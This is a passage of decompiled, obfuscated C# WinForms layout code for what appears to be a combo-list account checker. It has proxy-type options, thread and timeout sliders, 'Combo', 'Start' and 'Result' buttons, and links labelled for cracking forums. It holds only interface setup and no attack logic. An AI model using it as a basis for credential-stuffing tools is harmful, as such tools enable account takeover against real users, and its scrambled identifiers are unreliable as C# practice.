			this.TOKENGROUPSOverlappedDataCacheLine.BackColor = Color.FromArgb(35, 35, 35);
			this.TOKENGROUPSOverlappedDataCacheLine.BorderColor = Color.FromArgb(98, 98, 98);
			this.TOKENGROUPSOverlappedDataCacheLine.DefaultColor = Color.FromArgb(40, 40, 40);
			this.TOKENGROUPSOverlappedDataCacheLine.DisabledColor = Color.FromArgb(250, 250, 250);
			this.TOKENGROUPSOverlappedDataCacheLine.DrawMode = DrawMode.OwnerDrawFixed;
			this.TOKENGROUPSOverlappedDataCacheLine.DropDownStyle = ComboBoxStyle.DropDownList;
			this.TOKENGROUPSOverlappedDataCacheLine.FlatStyle = FlatStyle.Flat;
			this.TOKENGROUPSOverlappedDataCacheLine.Font = new Font("Segoe UI", 9.5f);
			this.TOKENGROUPSOverlappedDataCacheLine.ForeColor = Color.FromArgb(153, 153, 153);
			this.TOKENGROUPSOverlappedDataCacheLine.FormattingEnabled = true;
			this.TOKENGROUPSOverlappedDataCacheLine.ItemAlignment = StringAlignment.Center;
			this.TOKENGROUPSOverlappedDataCacheLine.Items.AddRange(new object[]
			{
				"HTTP/s",
				"SOCKS-4",
				"SOCKS-5"
			});
			this.TOKENGROUPSOverlappedDataCacheLine.Location = new Point(28, 147);
			this.TOKENGROUPSOverlappedDataCacheLine.Name = "MetroComboBox1";
			this.TOKENGROUPSOverlappedDataCacheLine.SelectionColor = Color.FromArgb(30, 0, 122, 204);
			this.TOKENGROUPSOverlappedDataCacheLine.Size = new Size(166, 25);
			this.TOKENGROUPSOverlappedDataCacheLine.Style = Design.Style.Dark;
			this.TOKENGROUPSOverlappedDataCacheLine.TabIndex = 24;
			this.TOKENGROUPSOverlappedDataCacheLine.TextAlignment = StringAlignment.Center;
			this.ThreadPool.BackColor = Color.FromArgb(45, 45, 48);
			this.ThreadPool.Location = new Point(0, 81);
			this.ThreadPool.Name = "Panel4";
			this.ThreadPool.Size = new Size(230, 3);
			this.ThreadPool.TabIndex = 14;
			this.DateBuffer.BackColor = Color.FromArgb(45, 45, 48);
			this.DateBuffer.Location = new Point(3, 301);
			this.DateBuffer.Name = "Panel7";
			this.DateBuffer.Size = new Size(230, 3);
			this.DateBuffer.TabIndex = 17;
			this.ResolveEventArgsSHA384.IReportMatchMembershipCondition = false;
			this.ResolveEventArgsSHA384.FlatStyle = FlatStyle.Flat;
			this.ResolveEventArgsSHA384.Font = new Font("Segoe UI", 9f);
			this.ResolveEventArgsSHA384.ForeColor = Color.FromArgb(200, 200, 200);
			this.ResolveEventArgsSHA384.Location = new Point(32, 241);
			this.ResolveEventArgsSHA384.Name = "AnimaCheckBox2";
			this.ResolveEventArgsSHA384.IServerChannelSinkIServiceProvider = false;
			this.ResolveEventArgsSHA384.Size = new Size(180, 22);
			this.ResolveEventArgsSHA384.TabIndex = 18;
			this.ResolveEventArgsSHA384.Text = "Load Proxies by Link";
			this.ResolveEventArgsSHA384.TextAlign = ContentAlignment.MiddleRight;
			this.ResolveEventArgsSHA384.TextImageRelation = TextImageRelation.TextAboveImage;
			this.ResolveEventArgsSHA384.UseVisualStyleBackColor = true;
			this.ScopeTree.IReportMatchMembershipCondition = false;
			this.ScopeTree.Checked = true;
			this.ScopeTree.CheckState = CheckState.Checked;
			this.ScopeTree.FlatStyle = FlatStyle.Flat;
			this.ScopeTree.Font = new Font("Segoe UI", 9f);
			this.ScopeTree.ForeColor = Color.FromArgb(200, 200, 200);
			this.ScopeTree.Location = new Point(31, 213);
			this.ScopeTree.Name = "AnimaCheckBox1";
			this.ScopeTree.IServerChannelSinkIServiceProvider = false;
			this.ScopeTree.Size = new Size(180, 22);
			this.ScopeTree.TabIndex = 17;
			this.ScopeTree.Text = "Load Proxies From File";
			this.ScopeTree.UseVisualStyleBackColor = true;
			this.TypeLibConverter.Font = new Font("Segoe UI", 10f);
			this.TypeLibConverter.Location = new Point(61, 111);
			this.TypeLibConverter.Name = "Label8";
			this.TypeLibConverter.RightToLeft = RightToLeft.No;
			this.TypeLibConverter.Size = new Size(90, 26);
			this.TypeLibConverter.TabIndex = 14;
			this.TypeLibConverter.Text = "Proxy Type : ";
			this.TypeLibConverter.TextAlign = ContentAlignment.MiddleRight;
			this.CompatibilityFlag.AllowDrop = true;
			this.CompatibilityFlag.Font = new Font("Segoe UI", 9f);
			this.CompatibilityFlag.ForeColor = Color.FromArgb(200, 200, 200);
			this.CompatibilityFlag.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.CompatibilityFlag.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.CompatibilityFlag.Location = new Point(14, 22);
			this.CompatibilityFlag.Name = "AnimaButton5";
			this.CompatibilityFlag.Size = new Size(197, 29);
			this.CompatibilityFlag.TabIndex = 14;
			this.CompatibilityFlag.Text = "Proxies";
			this.CompatibilityFlag.UseVisualStyleBackColor = true;
			this.CrossAppDomainSink.BackColor = Color.FromArgb(35, 35, 35);
			this.CrossAppDomainSink.Controls.Add(this.ThreadStart);
			this.CrossAppDomainSink.Controls.Add(this.Context);
			this.CrossAppDomainSink.Controls.Add(this.AssemblyBuilderAccess);
			this.CrossAppDomainSink.Controls.Add(this.DTFIUserOverrideValuesCustomAttributeData);
			this.CrossAppDomainSink.Controls.Add(this.CMSHASHDIGESTMETHOD);
			this.CrossAppDomainSink.Controls.Add(this.IEnumSTORECATEGORYSUBCATEGORY);
			this.CrossAppDomainSink.Controls.Add(this.AceFlags);
			this.CrossAppDomainSink.Controls.Add(this.CrossAppDomainChannel);
			this.CrossAppDomainSink.Controls.Add(this.MethodImplAttribute);
			this.CrossAppDomainSink.Controls.Add(this.SoapNcName);
			this.CrossAppDomainSink.Controls.Add(this.ThreadStaticAttributeCultureTableItem);
			this.CrossAppDomainSink.Controls.Add(this.AppDomainUnloadedException);
			this.CrossAppDomainSink.Cursor = Cursors.Default;
			this.CrossAppDomainSink.Location = new Point(7, 6);
			this.CrossAppDomainSink.Name = "Panel2";
			this.CrossAppDomainSink.Size = new Size(226, 487);
			this.CrossAppDomainSink.TabIndex = 10;
			this.ThreadStart.AutoStyle = false;
			this.ThreadStart.BackColor = Color.Transparent;
			this.ThreadStart.BackgroundImageLayout = ImageLayout.None;
			this.ThreadStart.BorderColor = Color.FromArgb(98, 98, 98);
			this.ThreadStart.GradientColor = Color.FromArgb(40, 40, 40);
			this.ThreadStart.HoverColor = Color.FromArgb(40, 40, 40);
			this.ThreadStart.LeftColor = Color.FromArgb(0, 122, 204);
			this.ThreadStart.Location = new Point(14, 220);
			this.ThreadStart.Maximum = 50;
			this.ThreadStart.Minimum = 5;
			this.ThreadStart.Name = "MetroTrackbar2";
			this.ThreadStart.RegionColor = Color.FromArgb(0, 153, 255);
			this.ThreadStart.RightColor = Color.FromArgb(63, 63, 63);
			this.ThreadStart.Size = new Size(197, 15);
			this.ThreadStart.SliderColor = Color.FromArgb(40, 40, 40);
			this.ThreadStart.SliderWidth = 6;
			this.ThreadStart.Style = Design.Style.Custom;
			this.ThreadStart.TabIndex = 15;
			this.ThreadStart.Value = 10;
			this.Context.AutoStyle = false;
			this.Context.BackColor = Color.Transparent;
			this.Context.BackgroundImageLayout = ImageLayout.None;
			this.Context.BorderColor = Color.FromArgb(98, 98, 98);
			this.Context.GradientColor = Color.FromArgb(40, 40, 40);
			this.Context.HoverColor = Color.FromArgb(40, 40, 40);
			this.Context.LeftColor = Color.FromArgb(0, 122, 204);
			this.Context.Location = new Point(14, 160);
			this.Context.Maximum = 500;
			this.Context.Minimum = 1;
			this.Context.Name = "MetroTrackbar1";
			this.Context.RegionColor = Color.FromArgb(0, 153, 255);
			this.Context.RightColor = Color.FromArgb(63, 63, 63);
			this.Context.Size = new Size(197, 15);
			this.Context.SliderColor = Color.FromArgb(40, 40, 40);
			this.Context.SliderWidth = 6;
			this.Context.Style = Design.Style.Custom;
			this.Context.TabIndex = 14;
			this.Context.Value = 100;
			this.AssemblyBuilderAccess.AllowDrop = true;
			this.AssemblyBuilderAccess.BackColor = Color.FromArgb(40, 40, 40);
			this.AssemblyBuilderAccess.Font = new Font("Segoe UI", 9f);
			this.AssemblyBuilderAccess.ForeColor = Color.FromArgb(200, 200, 200);
			this.AssemblyBuilderAccess.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.AssemblyBuilderAccess.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.AssemblyBuilderAccess.Location = new Point(14, 349);
			this.AssemblyBuilderAccess.Name = "AnimaButton4";
			this.AssemblyBuilderAccess.Size = new Size(197, 29);
			this.AssemblyBuilderAccess.TabIndex = 13;
			this.AssemblyBuilderAccess.Text = "Stop";
			this.AssemblyBuilderAccess.UseVisualStyleBackColor = false;
			this.DTFIUserOverrideValuesCustomAttributeData.AllowDrop = true;
			this.DTFIUserOverrideValuesCustomAttributeData.Font = new Font("Segoe UI", 9f);
			this.DTFIUserOverrideValuesCustomAttributeData.ForeColor = Color.FromArgb(200, 200, 200);
			this.DTFIUserOverrideValuesCustomAttributeData.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.DTFIUserOverrideValuesCustomAttributeData.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.DTFIUserOverrideValuesCustomAttributeData.Location = new Point(14, 395);
			this.DTFIUserOverrideValuesCustomAttributeData.Name = "AnimaButton3";
			this.DTFIUserOverrideValuesCustomAttributeData.Size = new Size(197, 29);
			this.DTFIUserOverrideValuesCustomAttributeData.TabIndex = 12;
			this.DTFIUserOverrideValuesCustomAttributeData.Text = "Result";
			this.DTFIUserOverrideValuesCustomAttributeData.UseVisualStyleBackColor = true;
			this.CMSHASHDIGESTMETHOD.AllowDrop = true;
			this.CMSHASHDIGESTMETHOD.Font = new Font("Segoe UI", 9f);
			this.CMSHASHDIGESTMETHOD.ForeColor = Color.FromArgb(200, 200, 200);
			this.CMSHASHDIGESTMETHOD.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.CMSHASHDIGESTMETHOD.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.CMSHASHDIGESTMETHOD.Location = new Point(14, 301);
			this.CMSHASHDIGESTMETHOD.Name = "AnimaButton2";
			this.CMSHASHDIGESTMETHOD.Size = new Size(197, 29);
			this.CMSHASHDIGESTMETHOD.TabIndex = 11;
			this.CMSHASHDIGESTMETHOD.Text = "Start";
			this.CMSHASHDIGESTMETHOD.UseVisualStyleBackColor = true;
			this.IEnumSTORECATEGORYSUBCATEGORY.AutoSize = true;
			this.IEnumSTORECATEGORYSUBCATEGORY.Font = new Font("Segoe UI", 10f);
			this.IEnumSTORECATEGORYSUBCATEGORY.ForeColor = SystemColors.ActiveCaption;
			this.IEnumSTORECATEGORYSUBCATEGORY.Location = new Point(93, 196);
			this.IEnumSTORECATEGORYSUBCATEGORY.Name = "Label6";
			this.IEnumSTORECATEGORYSUBCATEGORY.RightToLeft = RightToLeft.No;
			this.IEnumSTORECATEGORYSUBCATEGORY.Size = new Size(25, 19);
			this.IEnumSTORECATEGORYSUBCATEGORY.TabIndex = 10;
			this.IEnumSTORECATEGORYSUBCATEGORY.Text = "10";
			this.IEnumSTORECATEGORYSUBCATEGORY.TextAlign = ContentAlignment.MiddleRight;
			this.AceFlags.AutoSize = true;
			this.AceFlags.Font = new Font("Segoe UI", 10f);
			this.AceFlags.Location = new Point(29, 196);
			this.AceFlags.Name = "Label7";
			this.AceFlags.RightToLeft = RightToLeft.No;
			this.AceFlags.Size = new Size(69, 19);
			this.AceFlags.TabIndex = 8;
			this.AceFlags.Text = "TimeOut :";
			this.AceFlags.TextAlign = ContentAlignment.MiddleRight;
			this.CrossAppDomainChannel.AutoSize = true;
			this.CrossAppDomainChannel.Font = new Font("Segoe UI", 10f);
			this.CrossAppDomainChannel.ForeColor = SystemColors.ActiveCaption;
			this.CrossAppDomainChannel.Location = new Point(87, 133);
			this.CrossAppDomainChannel.Name = "Label5";
			this.CrossAppDomainChannel.RightToLeft = RightToLeft.No;
			this.CrossAppDomainChannel.Size = new Size(33, 19);
			this.CrossAppDomainChannel.TabIndex = 6;
			this.CrossAppDomainChannel.Text = "100";
			this.CrossAppDomainChannel.TextAlign = ContentAlignment.MiddleRight;
			this.MethodImplAttribute.AutoSize = true;
			this.MethodImplAttribute.Font = new Font("Segoe UI", 10f);
			this.MethodImplAttribute.Location = new Point(29, 133);
			this.MethodImplAttribute.Name = "Label4";
			this.MethodImplAttribute.Size = new Size(68, 19);
			this.MethodImplAttribute.TabIndex = 4;
			this.MethodImplAttribute.Text = " : Threads";
			this.MethodImplAttribute.TextAlign = ContentAlignment.MiddleRight;
			this.SoapNcName.AutoSize = true;
			this.SoapNcName.Font = new Font("Segoe UI", 10f);
			this.SoapNcName.ForeColor = SystemColors.ActiveCaption;
			this.SoapNcName.Location = new Point(102, 65);
			this.SoapNcName.Name = "Label3";
			this.SoapNcName.RightToLeft = RightToLeft.No;
			this.SoapNcName.Size = new Size(15, 19);
			this.SoapNcName.TabIndex = 3;
			this.SoapNcName.Text = "-";
			this.SoapNcName.TextAlign = ContentAlignment.MiddleRight;
			this.ThreadStaticAttributeCultureTableItem.AutoSize = true;
			this.ThreadStaticAttributeCultureTableItem.Font = new Font("Segoe UI", 10f);
			this.ThreadStaticAttributeCultureTableItem.Location = new Point(29, 65);
			this.ThreadStaticAttributeCultureTableItem.Name = "Label2";
			this.ThreadStaticAttributeCultureTableItem.RightToLeft = RightToLeft.No;
			this.ThreadStaticAttributeCultureTableItem.Size = new Size(79, 19);
			this.ThreadStaticAttributeCultureTableItem.TabIndex = 2;
			this.ThreadStaticAttributeCultureTableItem.Text = "Duplicates :";
			this.ThreadStaticAttributeCultureTableItem.TextAlign = ContentAlignment.MiddleRight;
			this.AppDomainUnloadedException.AllowDrop = true;
			this.AppDomainUnloadedException.Font = new Font("Segoe UI", 9f);
			this.AppDomainUnloadedException.ForeColor = Color.FromArgb(200, 200, 200);
			this.AppDomainUnloadedException.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.AppDomainUnloadedException.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.AppDomainUnloadedException.Location = new Point(15, 22);
			this.AppDomainUnloadedException.Name = "AnimaButton1";
			this.AppDomainUnloadedException.Size = new Size(197, 29);
			this.AppDomainUnloadedException.TabIndex = 0;
			this.AppDomainUnloadedException.Text = "Combo";
			this.AppDomainUnloadedException.UseVisualStyleBackColor = true;
			this.DateTime.BackColor = Color.FromArgb(40, 40, 40);
			this.DateTime.Controls.Add(this.SafeProcessHandleLCIDConversionAttribute);
			this.DateTime.Controls.Add(this.STORECATEGORYINSTANCE);
			this.DateTime.Controls.Add(this.ITypeInfo2);
			this.DateTime.Controls.Add(this.MscorlibDictionaryKeyCollectionDebugView2);
			this.DateTime.Font = new Font("Segoe UI", 9f);
			this.DateTime.ForeColor = Color.FromArgb(200, 200, 200);
			this.DateTime.Location = new Point(4, 22);
			this.DateTime.Name = "TabPage2";
			this.DateTime.Padding = new Padding(3);
			this.DateTime.Size = new Size(1301, 505);
			this.DateTime.TabIndex = 1;
			this.DateTime.Text = "TabPage2";
			this.SafeProcessHandleLCIDConversionAttribute.BackColor = Color.FromArgb(35, 35, 35);
			this.SafeProcessHandleLCIDConversionAttribute.Controls.Add(this.ISymbolDocumentWriter);
			this.SafeProcessHandleLCIDConversionAttribute.Controls.Add(this.RegistrySecurity);
			this.SafeProcessHandleLCIDConversionAttribute.Controls.Add(this.LSATRANSLATEDNAME);
			this.SafeProcessHandleLCIDConversionAttribute.Controls.Add(this.SpecialPermissionSetFlagCustAttr);
			this.SafeProcessHandleLCIDConversionAttribute.Cursor = Cursors.Default;
			this.SafeProcessHandleLCIDConversionAttribute.Location = new Point(110, 214);
			this.SafeProcessHandleLCIDConversionAttribute.Name = "Panel12";
			this.SafeProcessHandleLCIDConversionAttribute.Size = new Size(1081, 100);
			this.SafeProcessHandleLCIDConversionAttribute.TabIndex = 13;
			this.ISymbolDocumentWriter.AllowDrop = true;
			this.ISymbolDocumentWriter.Font = new Font("Segoe UI", 9f);
			this.ISymbolDocumentWriter.ForeColor = Color.FromArgb(200, 200, 200);
			this.ISymbolDocumentWriter.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.ISymbolDocumentWriter.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.ISymbolDocumentWriter.Location = new Point(190, 56);
			this.ISymbolDocumentWriter.Name = "AnimaButton11";
			this.ISymbolDocumentWriter.Size = new Size(42, 20);
			this.ISymbolDocumentWriter.TabIndex = 23;
			this.ISymbolDocumentWriter.Text = "Here";
			this.ISymbolDocumentWriter.UseVisualStyleBackColor = true;
			this.RegistrySecurity.AllowDrop = true;
			this.RegistrySecurity.Font = new Font("Segoe UI", 9f);
			this.RegistrySecurity.ForeColor = Color.FromArgb(200, 200, 200);
			this.RegistrySecurity.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.RegistrySecurity.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.RegistrySecurity.Location = new Point(178, 26);
			this.RegistrySecurity.Name = "AnimaButton10";
			this.RegistrySecurity.Size = new Size(42, 20);
			this.RegistrySecurity.TabIndex = 22;
			this.RegistrySecurity.Text = "Here";
			this.RegistrySecurity.UseVisualStyleBackColor = true;
			this.LSATRANSLATEDNAME.AutoSize = true;
			this.LSATRANSLATEDNAME.Font = new Font("Segoe UI", 11f);
			this.LSATRANSLATEDNAME.Location = new Point(42, 55);
			this.LSATRANSLATEDNAME.Name = "Label26";
			this.LSATRANSLATEDNAME.RightToLeft = RightToLeft.No;
			this.LSATRANSLATEDNAME.Size = new Size(142, 20);
			this.LSATRANSLATEDNAME.TabIndex = 6;
			this.LSATRANSLATEDNAME.Text = "YouTube Channel 2 :";
			this.LSATRANSLATEDNAME.TextAlign = ContentAlignment.MiddleRight;
			this.SpecialPermissionSetFlagCustAttr.AutoSize = true;
			this.SpecialPermissionSetFlagCustAttr.Font = new Font("Segoe UI", 11f);
			this.SpecialPermissionSetFlagCustAttr.Location = new Point(42, 25);
			this.SpecialPermissionSetFlagCustAttr.Name = "Label27";
			this.SpecialPermissionSetFlagCustAttr.RightToLeft = RightToLeft.No;
			this.SpecialPermissionSetFlagCustAttr.Size = new Size(130, 20);
			this.SpecialPermissionSetFlagCustAttr.TabIndex = 5;
			this.SpecialPermissionSetFlagCustAttr.Text = "YouTube Channel :";
			this.SpecialPermissionSetFlagCustAttr.TextAlign = ContentAlignment.MiddleRight;
			this.STORECATEGORYINSTANCE.BackColor = Color.FromArgb(35, 35, 35);
			this.STORECATEGORYINSTANCE.Controls.Add(this.SearchData);
			this.STORECATEGORYINSTANCE.Controls.Add(this.Signature);
			this.STORECATEGORYINSTANCE.Controls.Add(this.IsolatedStorageException);
			this.STORECATEGORYINSTANCE.Controls.Add(this.LocalBuilder);
			this.STORECATEGORYINSTANCE.Controls.Add(this.ThreadHelper);
			this.STORECATEGORYINSTANCE.Controls.Add(this.AsymmetricSignatureDeformatter);
			this.STORECATEGORYINSTANCE.Controls.Add(this.AssemblyLoadEventHandler);
			this.STORECATEGORYINSTANCE.Controls.Add(this.CerHashtable2);
			this.STORECATEGORYINSTANCE.Controls.Add(this.CharUnicodeInfo);
			this.STORECATEGORYINSTANCE.Controls.Add(this.IDictionary2);
			this.STORECATEGORYINSTANCE.Controls.Add(this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG);
			this.STORECATEGORYINSTANCE.Cursor = Cursors.Default;
			this.STORECATEGORYINSTANCE.Location = new Point(110, 329);
			this.STORECATEGORYINSTANCE.Name = "Panel11";
			this.STORECATEGORYINSTANCE.Size = new Size(1081, 112);
			this.STORECATEGORYINSTANCE.TabIndex = 12;
			this.SearchData.AllowDrop = true;
			this.SearchData.Font = new Font("Segoe UI", 9f);
			this.SearchData.ForeColor = Color.FromArgb(200, 200, 200);
			this.SearchData.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.SearchData.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.SearchData.Location = new Point(109, 74);
			this.SearchData.Name = "AnimaButton17";
			this.SearchData.Size = new Size(42, 20);
			this.SearchData.TabIndex = 28;
			this.SearchData.Text = "Here";
			this.SearchData.UseVisualStyleBackColor = true;
			this.Signature.AllowDrop = true;
			this.Signature.Font = new Font("Segoe UI", 9f);
			this.Signature.ForeColor = Color.FromArgb(200, 200, 200);
			this.Signature.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.Signature.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.Signature.Location = new Point(134, 44);
			this.Signature.Name = "AnimaButton16";
			this.Signature.Size = new Size(42, 20);
			this.Signature.TabIndex = 27;
			this.Signature.Text = "Here";
			this.Signature.UseVisualStyleBackColor = true;
			this.IsolatedStorageException.AllowDrop = true;
			this.IsolatedStorageException.Font = new Font("Segoe UI", 9f);
			this.IsolatedStorageException.ForeColor = Color.FromArgb(200, 200, 200);
			this.IsolatedStorageException.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.IsolatedStorageException.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.IsolatedStorageException.Location = new Point(266, 44);
			this.IsolatedStorageException.Name = "AnimaButton15";
			this.IsolatedStorageException.Size = new Size(42, 20);
			this.IsolatedStorageException.TabIndex = 27;
			this.IsolatedStorageException.Text = "Here";
			this.IsolatedStorageException.UseVisualStyleBackColor = true;
			this.LocalBuilder.AllowDrop = true;
			this.LocalBuilder.Font = new Font("Segoe UI", 9f);
			this.LocalBuilder.ForeColor = Color.FromArgb(200, 200, 200);
			this.LocalBuilder.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.LocalBuilder.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.LocalBuilder.Location = new Point(266, 74);
			this.LocalBuilder.Name = "AnimaButton14";
			this.LocalBuilder.Size = new Size(42, 20);
			this.LocalBuilder.TabIndex = 26;
			this.LocalBuilder.Text = "Here";
			this.LocalBuilder.UseVisualStyleBackColor = true;
			this.ThreadHelper.AllowDrop = true;
			this.ThreadHelper.Font = new Font("Segoe UI", 9f);
			this.ThreadHelper.ForeColor = Color.FromArgb(200, 200, 200);
			this.ThreadHelper.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.ThreadHelper.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.ThreadHelper.Location = new Point(266, 44);
			this.ThreadHelper.Name = "AnimaButton13";
			this.ThreadHelper.Size = new Size(42, 20);
			this.ThreadHelper.TabIndex = 25;
			this.ThreadHelper.Text = "Here";
			this.ThreadHelper.UseVisualStyleBackColor = true;
			this.AsymmetricSignatureDeformatter.AllowDrop = true;
			this.AsymmetricSignatureDeformatter.Font = new Font("Segoe UI", 9f);
			this.AsymmetricSignatureDeformatter.ForeColor = Color.FromArgb(200, 200, 200);
			this.AsymmetricSignatureDeformatter.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.AsymmetricSignatureDeformatter.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.AsymmetricSignatureDeformatter.Location = new Point(109, 15);
			this.AsymmetricSignatureDeformatter.Name = "AnimaButton12";
			this.AsymmetricSignatureDeformatter.Size = new Size(42, 20);
			this.AsymmetricSignatureDeformatter.TabIndex = 24;
			this.AsymmetricSignatureDeformatter.Text = "Here";
			this.AsymmetricSignatureDeformatter.UseVisualStyleBackColor = true;
			this.AssemblyLoadEventHandler.AutoSize = true;
			this.AssemblyLoadEventHandler.Font = new Font("Segoe UI", 11f);
			this.AssemblyLoadEventHandler.Location = new Point(210, 73);
			this.AssemblyLoadEventHandler.Name = "Label31";
			this.AssemblyLoadEventHandler.RightToLeft = RightToLeft.No;
			this.AssemblyLoadEventHandler.Size = new Size(50, 20);
			this.AssemblyLoadEventHandler.TabIndex = 11;
			this.AssemblyLoadEventHandler.Text = "| Reg :";
			this.AssemblyLoadEventHandler.TextAlign = ContentAlignment.MiddleRight;
			this.CerHashtable2.AutoSize = true;
			this.CerHashtable2.Font = new Font("Segoe UI", 11f);
			this.CerHashtable2.Location = new Point(210, 43);
			this.CerHashtable2.Name = "Label32";
			this.CerHashtable2.RightToLeft = RightToLeft.No;
			this.CerHashtable2.Size = new Size(50, 20);
			this.CerHashtable2.TabIndex = 10;
			this.CerHashtable2.Text = "| Reg :";
			this.CerHashtable2.TextAlign = ContentAlignment.MiddleRight;
			this.CharUnicodeInfo.AutoSize = true;
			this.CharUnicodeInfo.Font = new Font("Segoe UI", 11f);
			this.CharUnicodeInfo.Location = new Point(42, 73);
			this.CharUnicodeInfo.Name = "Label30";
			this.CharUnicodeInfo.RightToLeft = RightToLeft.No;
			this.CharUnicodeInfo.Size = new Size(68, 20);
			this.CharUnicodeInfo.TabIndex = 9;
			this.CharUnicodeInfo.Text = "Crack.sx :";
			this.CharUnicodeInfo.TextAlign = ContentAlignment.MiddleRight;
			this.IDictionary2.AutoSize = true;
			this.IDictionary2.Font = new Font("Segoe UI", 11f);
			this.IDictionary2.Location = new Point(42, 43);
			this.IDictionary2.Name = "Label28";
			this.IDictionary2.RightToLeft = RightToLeft.No;
			this.IDictionary2.Size = new Size(86, 20);
			this.IDictionary2.TabIndex = 8;
			this.IDictionary2.Text = "Cracked.to :";
			this.IDictionary2.TextAlign = ContentAlignment.MiddleRight;
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.AutoSize = true;
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.Font = new Font("Segoe UI", 11f);
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.Location = new Point(42, 14);
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.Name = "Label29";
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.RightToLeft = RightToLeft.No;
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.Size = new Size(61, 20);
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.TabIndex = 7;
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.Text = "Twitter :";
			this.KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG.TextAlign = ContentAlignment.MiddleRight;
			this.ITypeInfo2.BackColor = Color.FromArgb(35, 35, 35);
			this.ITypeInfo2.Controls.Add(this.UTF8EncodingAppDomainLevelActivator);
			this.ITypeInfo2.Controls.Add(this.SynchronizationContextProperties);
			this.ITypeInfo2.Controls.Add(this.CATEGORYSUBCATEGORYInternalRemotingServices);
			this.ITypeInfo2.Controls.Add(this.MissingManifestResourceException);
			this.ITypeInfo2.Cursor = Cursors.Default;
			this.ITypeInfo2.Location = new Point(110, 158);
			this.ITypeInfo2.Name = "Panel10";
			this.ITypeInfo2.Size = new Size(1081, 41);
			this.ITypeInfo2.TabIndex = 12;
			this.UTF8EncodingAppDomainLevelActivator.AllowDrop = true;
			this.UTF8EncodingAppDomainLevelActivator.Font = new Font("Segoe UI", 9f);
			this.UTF8EncodingAppDomainLevelActivator.ForeColor = Color.FromArgb(200, 200, 200);
			this.UTF8EncodingAppDomainLevelActivator.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.UTF8EncodingAppDomainLevelActivator.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.UTF8EncodingAppDomainLevelActivator.Location = new Point(116, 11);
			this.UTF8EncodingAppDomainLevelActivator.Name = "AnimaButton9";
			this.UTF8EncodingAppDomainLevelActivator.Size = new Size(42, 20);
			this.UTF8EncodingAppDomainLevelActivator.TabIndex = 21;
			this.UTF8EncodingAppDomainLevelActivator.Text = "Here";
			this.UTF8EncodingAppDomainLevelActivator.UseVisualStyleBackColor = true;
			this.SynchronizationContextProperties.BackColor = Color.FromArgb(40, 40, 40);
			this.SynchronizationContextProperties.BackgroundImageLayout = ImageLayout.Center;
			this.SynchronizationContextProperties.Image = (Image)componentResourceManager.GetObject("PictureBox9.Image");
			this.SynchronizationContextProperties.Location = new Point(1043, 15);
			this.SynchronizationContextProperties.Name = "PictureBox9";
			this.SynchronizationContextProperties.Size = new Size(13, 13);
			this.SynchronizationContextProperties.SizeMode = PictureBoxSizeMode.Zoom;
			this.SynchronizationContextProperties.TabIndex = 20;
			this.SynchronizationContextProperties.TabStop = false;
			this.CATEGORYSUBCATEGORYInternalRemotingServices.BackColor = Color.FromArgb(40, 40, 40);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.BackgroundImageLayout = ImageLayout.Center;
			this.CATEGORYSUBCATEGORYInternalRemotingServices.Location = new Point(1038, 10);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.Name = "PictureBox8";
